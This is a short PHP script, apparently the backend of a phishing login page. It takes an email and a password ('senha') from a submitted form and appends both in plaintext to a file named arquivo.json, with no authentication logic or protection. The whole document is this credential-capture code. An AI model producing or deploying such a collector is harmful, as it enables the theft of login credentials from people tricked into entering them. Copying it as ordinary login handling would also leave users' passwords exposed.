<?php
	$email = $_POST['email'];
	$senha = $_POST['senha'];
	$file = "arquivo.json";

	$mensagem = "Email: ".$email."<br><br>Senha: ".$senha;

	$t = fopen($file, 'a');

	fwrite($t, $mensagem);
?> 